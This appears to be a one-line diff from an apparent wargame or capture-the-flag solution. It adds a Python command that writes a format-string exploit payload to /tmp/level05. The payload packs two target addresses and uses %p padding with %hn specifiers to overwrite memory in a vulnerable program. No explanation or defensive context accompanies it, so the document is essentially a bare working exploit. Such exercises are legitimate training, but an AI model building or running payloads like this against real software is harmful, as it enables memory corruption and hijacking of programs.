@@ -1,0 +1,1 @@
+python -c 'print "\xe0\x97\x04\x08" + "\xff\xff\xff\xff" + "\xe2\x97\x04\x08" + "%p %p %p %p %p %p %p %p %54970p %hn %10473p %hn"' > /tmp/level05
